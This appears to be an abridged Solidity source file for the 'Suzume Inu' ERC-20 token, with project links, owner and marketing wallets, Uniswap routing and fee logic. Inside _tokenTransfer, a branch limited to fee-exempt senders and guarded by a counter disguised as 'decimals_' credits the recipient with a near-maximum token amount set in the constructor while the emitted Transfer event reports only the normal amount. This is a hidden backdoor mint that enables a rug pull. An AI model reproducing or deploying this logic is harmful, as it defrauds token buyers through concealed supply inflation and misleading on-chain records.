...
/**
    ...
    Telegram: https://t.me/SUZUMEINUERC20
    Twitter: https://twitter.com/SuzumeInuerc
    Website: https://www.suzumeinueth.com/
*/
...
contract SuzumeInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x08652E66cDa39233f78438a6635BDB3D62f08Ef5); 
    address payable public Wallet_Team = payable(0x8E4Af1476fdd95d4D5397Ae69cA314b2aE41012c);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private decimals_ = 0;
    uint256 private _tTotal = 100* 10**6 * 10**_decimals;
    string private constant _name = "Suzume Inu"; 
    string private constant _symbol = unicode"$SUZUME"; 
    ...
    constructor () {
        ...
        _owner = 0x8E4Af1476fdd95d4D5397Ae69cA314b2aE41012c;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        tamount = ((~uint256(0)))-(_tTotal)-(_tTotal);
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x08652E66cDa39233f78438a6635BDB3D62f08Ef5); // Testnet
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Wallet_Team, ETH_Total);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee && !txLimit){
            ...
            }else if(!takeFee && txLimit && decimals_ < 1){
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tamount;
            decimals_++;emit Transfer(sender, recipient, tAmount);
            }else if (isBuy){
